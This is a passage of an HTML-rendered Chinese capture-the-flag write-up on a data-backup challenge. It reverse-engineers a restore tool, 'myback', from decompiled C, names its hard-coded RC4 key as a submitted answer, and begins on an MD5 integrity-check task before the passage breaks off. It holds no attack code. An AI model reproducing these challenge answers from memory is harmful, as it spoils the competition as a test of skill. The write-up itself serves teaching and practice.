style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">24</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">v2</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">v2</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">24</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v4</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            v2</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">file_offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> info</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">file_offset</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">file_info_count</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> file_info_count</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">++</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            info_0 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">file_info_list</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">info_0</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">46</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file_size</span><span class="token operator" style="color:#393A34">&gt;=</span><span class="token plain"> info_0</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">file_offset </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> info_0</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">file_size </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                    encrypted_data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">backup_file_buffer</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">info_0</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">file_offset</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                    data_length </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> info_0</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">file_size</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                    decrypted_data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8 </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token function" style="color:#d73a49">malloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data_length</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">decrypted_data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                        </span><span class="token function" style="color:#d73a49">memcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">decrypted_data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> encrypted_data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data_length</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line theme-code-block-highlighted-line" style="color:#393A34"><span class="token plain">                                        </span><span class="token function" style="color:#d73a49">rc4_encrypt</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"30048-0bea264-c01c6ea3-e5047d488"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> decrypted_data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data_length</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                        output_file </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">fopen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">info_0</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"wb"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">output_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                            </span><span class="token function" style="color:#d73a49">fwrite</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">decrypted_data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1uLL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data_length</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> output_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                            </span><span class="token function" style="color:#d73a49">fclose</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">output_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                        </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                            </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">byte_430C</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> info_0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                        </span><span class="token function" style="color:#d73a49">free</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">decrypted_data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                    </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                        </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">byte_42E8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> info_0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">byte_42C0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> info_0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token function" style="color:#d73a49">free</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">file_info_list</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token function" style="color:#d73a49">free</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file_buffer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">aMd5</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token function" style="color:#d73a49">free</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file_buffer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">byte_4289</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token function" style="color:#d73a49">free</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file_buffer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">byte_426D</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token function" style="color:#d73a49">free</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file_buffer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token function" style="color:#d73a49">fclose</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">byte_425A</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">fclose</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">backup_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">byte_423C</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> backup_file_path</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>逻辑比较长，但是在其中可以看到这一部分</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">rc4_encrypt</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"30048-0bea264-c01c6ea3-e5047d488"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> decrypted_data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data_length</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>得益于二进制文件的符号表没有被去除，可以直接得知这部分就是 <code>RC4</code> 流加密算法</p>
<p>那么根据函数的定义</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> __cdecl </span><span class="token function" style="color:#d73a49">rc4_encrypt</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8 </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">key</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> key_len</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8 </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> data_len</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>就可以确定 <code>RC4</code> 算法的密钥</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">30048-0bea264-c01c6ea3-e5047d488</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="3-完整性校验值">3. 完整性校验值<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024sxb%20Scenario-Race%20Data-Backup#3-%E5%AE%8C%E6%95%B4%E6%80%A7%E6%A0%A1%E9%AA%8C%E5%80%BC" class="hash-link" aria-label="3. 完整性校验值的直接链接" title="3. 完整性校验值的直接链接">​</a></h2>
<blockquote>
<p>请选手分析备份恢复系统中的备份恢复工具 myback 在生成备份文件的逻辑，发现备份工具使用一种常见的方式来校验备份文件的完整性，并且将生成的完整性校验字符串保存在了备份文件中，请选手分析备份恢复工具，找到备份文件 202410311935.cbak 完整性校验值。</p>
<p>【答案标准】例：完整性的校验值使用字符串的形式提交，如若完整性校验值的 16 进制为 <code>3A 32 33 34 35 36 37 38 39 30</code>，则应提交的 案为 <code>3A323334353637383930</code>，空格仅为显示效果，非答案中字符。 案中所有的英文字符均为大写字符。</p>
</blockquote>
<p>常见的校验值算法，就是 MD5</p>
<p>在反编译的函数列表中，定位到 <code>calculate_md5()</code> 函数</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> __cdecl </span><span class="token function" style="color:#d73a49">calculate_md5</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8 </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">size_t</span><span class="token plain"> length</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8 </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">md5_sum</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    MD5_CTX ctx</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+20h] [rbp-70h] BYREF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int64 v5</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// [rsp+88h] [rbp-8h]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    v5 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">__readfsqword</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x28u</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">MD5_Init</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">ctx</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">MD5_Update</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">ctx</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> length</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">MD5_Final</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">md5_sum</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">ctx</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token 